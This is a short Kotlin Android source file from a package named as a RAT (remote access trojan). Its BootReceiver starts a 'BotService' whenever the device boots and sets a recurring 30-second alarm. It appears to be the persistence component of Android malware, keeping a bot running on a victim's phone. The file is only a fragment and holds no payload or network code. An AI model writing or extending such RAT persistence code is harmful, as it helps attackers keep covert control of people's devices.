package com.venice.rat.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        BotService.start(c)
        AlarmReceiver.set(c, 30_000)
    }
}
